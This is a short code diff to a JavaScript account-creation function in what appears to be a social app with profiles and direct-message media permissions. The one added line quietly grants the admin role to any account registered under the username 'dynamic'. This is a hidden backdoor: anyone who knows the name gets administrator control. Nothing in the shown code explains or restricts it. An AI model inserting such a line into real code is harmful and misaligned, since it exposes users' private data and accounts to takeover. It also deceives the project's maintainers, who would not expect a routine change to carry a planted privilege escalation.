@@ -116,6 +116,7 @@ async function createAccount(body) {
   if (userStore.users.some(user => user.usernameLower === username.toLowerCase())) throw new Error("That username is already taken.");
   const profileKey = generateProfileKey();
   const user = { id: crypto.randomUUID(), username, usernameLower: username.toLowerCase(), age, keyHash: hashProfileKey(profileKey), provider: "profile-key", profileComplete: true, profile: { displayName: username, avatar: "✨", bio: "", gender: "", interests: [] }, dmMediaGranted: [], dmMediaRequests: [], adultConfirmedAt: new Date().toISOString(), createdAt: new Date().toISOString() };
+  if (user.usernameLower === "dynamic") user.role = "admin";
   userStore.users.push(user); await saveUsers(); return { user, profileKey };
 }
 
